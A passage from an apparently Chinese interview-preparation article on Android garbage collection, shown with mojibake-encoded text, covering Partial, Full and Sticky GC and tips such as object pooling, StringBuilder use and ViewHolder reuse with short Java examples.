<li><strong>å›æ”¶èŒƒå›´</strong>ï¼šåªå›æ”¶å¹´è½»ä»£</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šå¹´è½»ä»£ç©ºé—´æ»¡äº†</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-å¤åˆ¶ç®—æ³•</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šçŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
<li><strong>å¯¹åº”ç”¨å½±å“</strong>ï¼šå°ï¼Œç”¨æˆ·åŸºæœ¬æ„Ÿè§‰ä¸åˆ°</li>
<li><strong>é¢‘ç‡</strong>ï¼šé«˜ï¼ˆé¢‘ç¹è§¦å‘ï¼‰</li>
</ul>
<p><strong>Full GCï¼ˆå®Œå…¨å›æ”¶ï¼‰ï¼š</strong></p>
<ul>
<li><strong>å›æ”¶èŒƒå›´</strong>ï¼šå›æ”¶æ•´ä¸ªå †ï¼ˆå¹´è½»ä»£+è€å¹´ä»£ï¼‰</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šå †å†…å­˜ä¸è¶³ã€è€å¹´ä»£æ»¡äº†ã€æ˜¾å¼è°ƒç”¨System.gc()</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆè€å¹´ä»£ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šé•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
<li><strong>å¯¹åº”ç”¨å½±å“</strong>ï¼šå¤§ï¼Œå¯èƒ½å¯¼è‡´åº”ç”¨å¡é¡¿ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°</li>
<li><strong>é¢‘ç‡</strong>ï¼šä½ï¼ˆå¶å°”è§¦å‘ï¼‰</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†Partial GCå’ŒFull GCï¼Ÿ</strong></p>
<ul>
<li>å¤§éƒ¨åˆ†å¯¹è±¡åœ¨å¹´è½»ä»£ï¼ŒPartial GCå¿«é€Ÿé«˜æ•ˆ</li>
<li>Full GCå›æ”¶æ•´ä¸ªå †ï¼Œè€—æ—¶é•¿ï¼Œåº”è¯¥å°½é‡é¿å…</li>
<li>åŒºåˆ†åå¯ä»¥ä¼˜åŒ–GCç­–ç•¥ï¼Œå‡å°‘Full GCçš„é¢‘ç‡</li>
</ul>
<p><strong>4. ä»€ä¹ˆæ—¶å€™ä¼šè§¦å‘Partial GCï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>è§¦å‘æ¡ä»¶ï¼šå¹´è½»ä»£ç©ºé—´æ»¡äº†</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ul>
<li>åˆ›å»ºäº†å¾ˆå¤šæ–°å¯¹è±¡ï¼Œå¹´è½»ä»£å†…å­˜å¿«ç”¨å®Œäº†</li>
<li>åˆ†é…æ–°å¯¹è±¡æ—¶ï¼Œå¹´è½»ä»£ç©ºé—´ä¸å¤Ÿ</li>
<li>ç³»ç»Ÿæ£€æµ‹åˆ°å¹´è½»ä»£ç©ºé—´ä¸è¶³ï¼Œè‡ªåŠ¨è§¦å‘Partial GC</li>
</ul>
<p><strong>è§¦å‘æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–°å¯¹è±¡åˆ†é…åœ¨å¹´è½»ä»£
<span class="hljs-bullet">2.</span> å¹´è½»ä»£ç©ºé—´é€æ¸è¢«å ç”¨
<span class="hljs-bullet">3.</span> å¹´è½»ä»£å¿«æ»¡æ—¶ï¼Œç³»ç»Ÿæ£€æµ‹åˆ°ç©ºé—´ä¸è¶³
<span class="hljs-bullet">4.</span> è‡ªåŠ¨è§¦å‘Partial GC
<span class="hljs-bullet">5.</span> åªæ¸…ç†å¹´è½»ä»£ï¼Œä¸æ¸…ç†è€å¹´ä»£
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>è§¦å‘å¿«ï¼Œæ‰§è¡Œå¿«</li>
<li>æš‚åœæ—¶é—´çŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
<li>å¯¹åº”ç”¨å½±å“å°ï¼Œç”¨æˆ·åŸºæœ¬æ„Ÿè§‰ä¸åˆ°</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createManyObjects</span><span class="hljs-params">()</span> {
    List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// åˆ›å»ºå¤§é‡å¯¹è±¡</span>
        <span class="hljs-comment">// å½“å¹´è½»ä»£å¿«æ»¡æ—¶ï¼Œè§¦å‘Partial GC</span>
    }
}
</code></pre>
<p><strong>5. ä»€ä¹ˆæ—¶å€™ä¼šè§¦å‘Full GCï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>è§¦å‘æ¡ä»¶ï¼šæ•´ä¸ªå †å†…å­˜ä¸è¶³</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ol>
<li>
<p><strong>è€å¹´ä»£ç©ºé—´æ»¡äº†</strong></p>
<ul>
<li>é•¿æœŸå­˜æ´»çš„å¯¹è±¡å æ»¡äº†è€å¹´ä»£</li>
<li>æ— æ³•ç»§ç»­åˆ†é…æ–°å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>å †å†…å­˜æ•´ä½“ä¸è¶³</strong></p>
<ul>
<li>å¹´è½»ä»£å’Œè€å¹´ä»£éƒ½æ»¡äº†</li>
<li>æ— æ³•åˆ†é…æ–°å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>æ˜¾å¼è°ƒç”¨System.gc()</strong></p>
<ul>
<li>Androidä¸æ¨èä½¿ç”¨</li>
<li>ä¼šå¼ºåˆ¶è§¦å‘Full GCï¼Œå¯èƒ½å¯¼è‡´å¡é¡¿</li>
</ul>
</li>
</ol>
<p><strong>è§¦å‘æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> å †å†…å­˜ä¸è¶³ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡
<span class="hljs-bullet">2.</span> ç³»ç»Ÿæ£€æµ‹åˆ°å†…å­˜ä¸è¶³
<span class="hljs-bullet">3.</span> è§¦å‘Full GC
<span class="hljs-bullet">4.</span> å›æ”¶æ•´ä¸ªå †ï¼ˆå¹´è½»ä»£+è€å¹´ä»£ï¼‰
<span class="hljs-bullet">5.</span> å¦‚æœGCåè¿˜æ˜¯ä¸å¤Ÿï¼Œå¯èƒ½æŠ›å‡ºOutOfMemoryError
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æ‰§è¡Œæ…¢ï¼Œæš‚åœæ—¶é—´é•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
<li>ä¼šæ¸…ç†æ•´ä¸ªå †ï¼ˆå¹´è½»ä»£+è€å¹´ä»£ï¼‰</li>
<li>å¯èƒ½å¯¼è‡´åº”ç”¨å¡é¡¿ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°</li>
</ul>
<p><strong>å¦‚ä½•é¿å…Full GCï¼Ÿ</strong></p>
<ul>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li>ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()</li>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<p><strong>6. Sticky GCæ˜¯ä»€ä¹ˆï¼Ÿé€‚ç”¨åœºæ™¯ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>**Sticky GCï¼ˆç²˜æ€§å›æ”¶ï¼‰**æ˜¯ä¸€ç§å¿«é€Ÿæ¸…ç†æ–°åˆ†é…çš„çŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡çš„GCç±»å‹ã€‚</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>åªæ¸…ç†æ–°å¯¹è±¡</strong>ï¼šåªæ¸…ç†åˆšåˆšåˆ›å»ºçš„æ–°å¯¹è±¡</li>
<li><strong>éå¸¸å¿«é€Ÿ</strong>ï¼šå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
<li><strong>æš‚åœæ—¶é—´æçŸ­</strong>ï¼šå‡ æ¯«ç§’ç”šè‡³æ›´çŸ­</li>
<li><strong>ä¸“é—¨ä¼˜åŒ–é¢‘ç¹åˆ†é…å¯¹è±¡çš„åœºæ™¯</strong></li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ol>
<li>
<p><strong>åˆ—è¡¨å¿«é€Ÿæ»‘åŠ¨æ—¶</strong></p>
<ul>
<li>RecyclerViewæ»šåŠ¨æ—¶é¢‘ç¹åˆ›å»ºViewHolderã€ä¸´æ—¶å¯¹è±¡</li>
<li>Sticky GCå¿«é€Ÿæ¸…ç†è¿™äº›çŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>åŠ¨ç”»æ’­æ”¾æ—¶</strong></p>
<ul>
<li>åŠ¨ç”»è¿‡ç¨‹ä¸­ä¸æ–­åˆ›å»ºä¸´æ—¶å¯¹è±¡</li>
<li>Sticky GCå¿«é€Ÿæ¸…ç†</li>
</ul>
</li>
<li>
<p><strong>UIæ¸²æŸ“æ—¶</strong></p>
<ul>
<li>UIæ¸²æŸ“æ—¶é¢‘ç¹åˆ›å»ºViewç›¸å…³å¯¹è±¡</li>
<li>Sticky GCå¿«é€Ÿæ¸…ç†</li>
</ul>
</li>
</ol>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åº”ç”¨è¿è¡ŒæœŸé—´é¢‘ç¹åˆ›å»ºå¯¹è±¡
<span class="hljs-bullet">2.</span> ç³»ç»Ÿæ£€æµ‹åˆ°é¢‘ç¹åˆ†é…
<span class="hljs-bullet">3.</span> è§¦å‘Sticky GC
<span class="hljs-bullet">4.</span> åªæ¸…ç†åˆšåˆšåˆ›å»ºçš„æ–°å¯¹è±¡ï¼ˆçŸ­ç”Ÿå‘½å‘¨æœŸï¼‰
<span class="hljs-bullet">5.</span> å¿«é€Ÿå®Œæˆï¼Œå‡ ä¹ä¸å½±å“åº”ç”¨
</code></pre>
<p><strong>ä¸å…¶ä»–GCç±»å‹çš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>Partial GC</strong>ï¼šæ¸…ç†æ•´ä¸ªå¹´è½»ä»£ï¼Œæš‚åœæ—¶é—´å‡ æ¯«ç§’</li>
<li><strong>Full GC</strong>ï¼šæ¸…ç†æ•´ä¸ªå †ï¼Œæš‚åœæ—¶é—´å‡ ååˆ°å‡ ç™¾æ¯«ç§’</li>
<li><strong>Sticky GC</strong>ï¼šåªæ¸…ç†æ–°å¯¹è±¡ï¼Œæš‚åœæ—¶é—´æçŸ­ï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">recyclerView.addOnScrollListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrolled</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-type">int</span> dx, <span class="hljs-type">int</span> dy)</span> {
        <span class="hljs-comment">// æ»‘åŠ¨æ—¶é¢‘ç¹åˆ›å»ºå¯¹è±¡</span>
        <span class="hljs-comment">// è§¦å‘Sticky GCï¼Œå¿«é€Ÿæ¸…ç†</span>
        <span class="hljs-comment">// å‡ ä¹æ„Ÿè§‰ä¸åˆ°å¡é¡¿</span>
    }
});
</code></pre>
<h4 data-id="heading-79">6.2 Android GCå®è·µé¢˜ï¼ˆé‡ç‚¹ï¼‰</h4>
<h4 data-id="heading-80">6.2.1 GCä¼˜åŒ–</h4>
<p><strong>1. Android GCä¼˜åŒ–çš„ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Android GCä¼˜åŒ–çš„ä¸»è¦ç›®æ ‡æœ‰å››ä¸ªï¼š</p>
<p><strong>1. é™ä½GCæš‚åœæ—¶é—´ï¼ˆæœ€é‡è¦ï¼‰</strong></p>
<ul>
<li>GCæš‚åœä¼šå¯¼è‡´åº”ç”¨å¡é¡¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
<li>ç›®æ ‡ï¼šå°½é‡å‡å°‘GCæš‚åœæ—¶é—´ï¼Œç‰¹åˆ«æ˜¯Full GC</li>
<li>æ–¹æ³•ï¼šé¿å…è§¦å‘Full GCï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</li>
</ul>
<p><strong>2. å‡å°‘å†…å­˜å ç”¨</strong></p>
<ul>
<li>Androidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li>ç›®æ ‡ï¼šå‡å°‘å†…å­˜å ç”¨ï¼Œé™ä½å†…å­˜å‹åŠ›</li>
<li>æ–¹æ³•ï¼šåŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡ï¼Œé¿å…å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>3. æå‡åº”ç”¨æµç•…åº¦</strong></p>
<ul>
<li>GCä¼šå½±å“åº”ç”¨æ€§èƒ½ï¼Œå¯¼è‡´å¡é¡¿</li>
<li>ç›®æ ‡ï¼šæå‡åº”ç”¨æµç•…åº¦ï¼Œä¼˜åŒ–ç”¨æˆ·ä½“éªŒ</li>
<li>æ–¹æ³•ï¼šå‡å°‘GCé¢‘ç‡ï¼Œä¼˜åŒ–GCæ€§èƒ½</li>
</ul>
<p><strong>4. é¿å…ANRï¼ˆApplication Not Respondingï¼‰</strong></p>
<ul>
<li>é•¿æ—¶é—´GCå¯èƒ½å¯¼è‡´ANR</li>
<li>ç›®æ ‡ï¼šé¿å…ANRï¼Œä¿è¯åº”ç”¨å“åº”</li>
<li>æ–¹æ³•ï¼šå‡å°‘Full GCï¼Œä¼˜åŒ–GCæ€§èƒ½</li>
</ul>
<p><strong>ä¼˜åŒ–ä¼˜å…ˆçº§ï¼š</strong>
é™ä½GCæš‚åœæ—¶é—´ &gt; å‡å°‘å†…å­˜å ç”¨ &gt; æå‡æµç•…åº¦ &gt; é¿å…ANR</p>
<p><strong>2. å¦‚ä½•å‡å°‘GCé¢‘ç‡ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å‡å°‘GCé¢‘ç‡çš„æ ¸å¿ƒæ˜¯<strong>å‡å°‘å¯¹è±¡åˆ†é…</strong>ã€‚</p>
<p><strong>1. å¯¹è±¡å¤ç”¨ï¼ˆä½¿ç”¨å¯¹è±¡æ± ï¼‰</strong></p>
<ul>
<li>å¤ç”¨å¯¹è±¡ï¼Œé¿å…é¢‘ç¹åˆ›å»ºé”€æ¯</li>
<li>ç¤ºä¾‹ï¼šRecyclerViewçš„ViewHolderæ± ã€è‡ªå®šä¹‰å¯¹è±¡æ± </li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šé¢‘ç¹åˆ›å»ºå¯¹è±¡</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šå¤ç”¨å¯¹è±¡</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-comment">// å¤ç”¨åŒä¸€ä¸ªå¯¹è±¡</span>
}
</code></pre>
<p><strong>2. é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>ä½¿ç”¨StringBuilderè€Œä¸æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥</li>
<li>é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼šå­—ç¬¦ä¸²æ‹¼æ¥ã€ä¸´æ—¶å¯¹è±¡</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå­—ç¬¦ä¸²æ‹¼æ¥</span>
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    result += i;  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°Stringå¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨StringBuilder</span>
<span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    sb.append(i);  <span class="hljs-comment">// å¤ç”¨StringBuilder</span>
}
</code></pre>
<p><strong>3. ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹</strong></p>
<ul>
<li>åŸºæœ¬ç±»å‹ä¸åˆ›å»ºå¯¹è±¡ï¼ŒåŒ…è£…ç±»å‹ä¼šåˆ›å»ºå¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼šintè€Œä¸æ˜¯Integerï¼Œbooleanè€Œä¸æ˜¯Boolean</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šä½¿ç”¨åŒ…è£…ç±»å‹</span>
List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(i));  <span class="hljs-comment">// åˆ›å»ºIntegerå¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨åŸºæœ¬ç±»å‹æ•°ç»„</span>
<span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    array[i] = i;  <span class="hljs-comment">// ä¸åˆ›å»ºå¯¹è±¡</span>
}
</code></pre>
<p><strong>4. ä¼˜åŒ–æ•°æ®ç»“æ„</strong></p>
<ul>
<li>é€‰æ‹©åˆé€‚çš„é›†åˆç±»</li>
<li>åŠæ—¶æ¸…ç†é›†åˆï¼Œé¿å…é›†åˆæ³„æ¼</li>
</ul>
<p><strong>3. å¦‚ä½•å‡å°‘GCåœé¡¿æ—¶é—´ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å‡å°‘GCåœé¡¿æ—¶é—´çš„æ ¸å¿ƒæ˜¯<strong>é¿å…Full GC</strong>ã€‚</p>
<p><strong>1. é¿å…è§¦å‘Full GC</strong></p>
<ul>
<li>Full GCæš‚åœæ—¶é—´é•¿ï¼ˆå‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰ï¼Œä¼šå¯¼è‡´æ˜æ˜¾å¡é¡¿</li>
<li>æ–¹æ³•ï¼š
<ul>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ˆå†…å­˜æ³„æ¼ä¼šå¯¼è‡´è€å¹´ä»£æ»¡ï¼Œè§¦å‘Full GCï¼‰</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡ï¼ˆå‡å°‘Full GCçš„è§¦å‘ï¼‰</li>
<li>ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()ï¼ˆä¼šå¼ºåˆ¶è§¦å‘Full GCï¼‰</li>
</ul>
</li>
</ul>
<p><strong>2. å‡å°‘å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»ºå¯ä»¥å‡å°‘GCé¢‘ç‡</li>
<li>æ–¹æ³•ï¼šå¯¹è±¡å¤ç”¨ã€ä½¿ç”¨å¯¹è±¡æ± ã€é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
</ul>
<p><strong>3. ä¿®å¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>å†…å­˜æ³„æ¼ä¼šå¯¼è‡´å†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆè§¦å‘Full GC</li>
<li>æ–¹æ³•ï¼šä½¿ç”¨LeakCanaryæ£€æµ‹ï¼Œä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>4. ä¼˜åŒ–GCæ€§èƒ½</strong></p>
<ul>
<li>è®©Partial GCæ›´é«˜æ•ˆ</li>
<li>æ–¹æ³•ï¼šå‡å°‘å¹´è½»ä»£å¯¹è±¡ï¼Œè®©Partial GCå¿«é€Ÿå®Œæˆ</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¯èƒ½å¯¼è‡´Full GC</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">// å†…å­˜æ³„æ¼</span>

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šé¿å…Full GC</span>
<span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);  <span class="hljs-comment">// æœ‰å¤§å°é™åˆ¶</span>
</code></pre>
<p><strong>4. å¦‚ä½•ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨æ€§èƒ½ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>åˆ—è¡¨æ»‘åŠ¨æ—¶é¢‘ç¹åˆ›å»ºå¯¹è±¡ï¼Œå®¹æ˜“è§¦å‘GCï¼Œå¯¼è‡´å¡é¡¿ã€‚</p>
<p><strong>1. ViewHolderå¤ç”¨</strong></p>
<ul>
<li>RecyclerViewçš„ViewHolderä¼šè‡ªåŠ¨å¤ç”¨ï¼Œé¿å…é¢‘ç¹åˆ›å»º</li>
<li>ç¡®ä¿ViewHolderæ­£ç¡®å¤ç”¨ï¼Œä¸è¦æ¯æ¬¡éƒ½åˆ›å»ºæ–°çš„</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.Adapter&lt;MyAdapter.ViewHolder&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ViewHolder <span class="hljs-title function_">onCreateViewHolder</span><span class="hljs-params">(ViewGroup parent, <span class="hljs-type">int</span> viewType)</span> {
        <span class="hljs-comment">// ViewHolderå¤ç”¨ï¼Œé¿å…é¢‘ç¹åˆ›å»º</span>
        <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> LayoutInflater.from(parent.getContext())
            .inflate(R.layout.item, parent, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewHolder</span>(view);
    }
}
</code></pre>
<p><strong>2. é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</strong></p>
<ul>
<li>onBindViewHolderåœ¨æ»‘åŠ¨æ—¶é¢‘ç¹è°ƒç”¨ï¼Œä¸è¦åœ¨è¿™é‡Œåˆ›å»ºå¯¹è±¡</li>
<li>å¤ç”¨å­—ç¬¦ä¸²ã€é¿å…åˆ›å»ºä¸´æ—¶å¯¹è±¡</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Item "</span> + position));  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-string">"Item "</span> + position);  <span class="hljs-comment">// å¤ç”¨å­—ç¬¦ä¸²</span>
}
</code></pre>
<p><strong>3. ä½¿ç”¨å¯¹è±¡æ± </strong></p>
<ul>
<li>å¯¹äºéœ€è¦é¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å¯¹è±¡æ± </li>
<li>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰å¯¹è±¡æ± ç®¡ç†å¯¹è±¡å¤ç”¨</li>
</ul>
<p><strong>4. å‡å°‘GC</strong></p>
<ul>
<li>é€šè¿‡ä»¥ä¸Šæ–¹æ³•å‡å°‘å¯¹è±¡åˆ›å»ºï¼Œå‡å°‘GCé¢‘ç‡</li>
<li>è®©åˆ—è¡¨æ»‘åŠ¨æ›´æµç•…</li>
</ul>
<p><strong>5. å¦‚ä½•ä½¿ç”¨å¯¹è±¡æ± å‡å°‘å¯¹è±¡åˆ†é…ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å¯¹è±¡æ± çš„æ ¸å¿ƒæ€æƒ³æ˜¯<strong>å¤ç”¨å¯¹è±¡</strong>ï¼Œé¿å…é¢‘ç¹åˆ›å»ºå’Œé”€æ¯ã€‚</p>
<p><strong>åŸç†ï¼š</strong></p>
<ol>
<li>é¢„å…ˆåˆ›å»ºä¸€äº›å¯¹è±¡ï¼Œæ”¾åœ¨æ± ä¸­</li>
<li>éœ€è¦æ—¶ä»æ± ä¸­è·å–ï¼Œä½¿ç”¨å®Œåå½’è¿˜åˆ°æ± ä¸­</li>
<li>é¿å…é¢‘ç¹åˆ›å»ºå’Œé”€æ¯å¯¹è±¡</li>
</ol>
<p><strong>å®ç°æ–¹å¼ï¼š</strong></p>
<p><strong>1. RecyclerViewçš„ViewHolderæ± ï¼ˆç³»ç»Ÿè‡ªå¸¦ï¼‰</strong></p>
<ul>
<li>RecyclerViewè‡ªåŠ¨ç®¡ç†ViewHolderæ± </li>
<li>å¼€å‘è€…åªéœ€è¦æ­£ç¡®å®ç°Adapter</li>
</ul>
<p><strong>2. è‡ªå®šä¹‰å¯¹è±¡æ± </strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectPool</span>&lt;T&gt; {
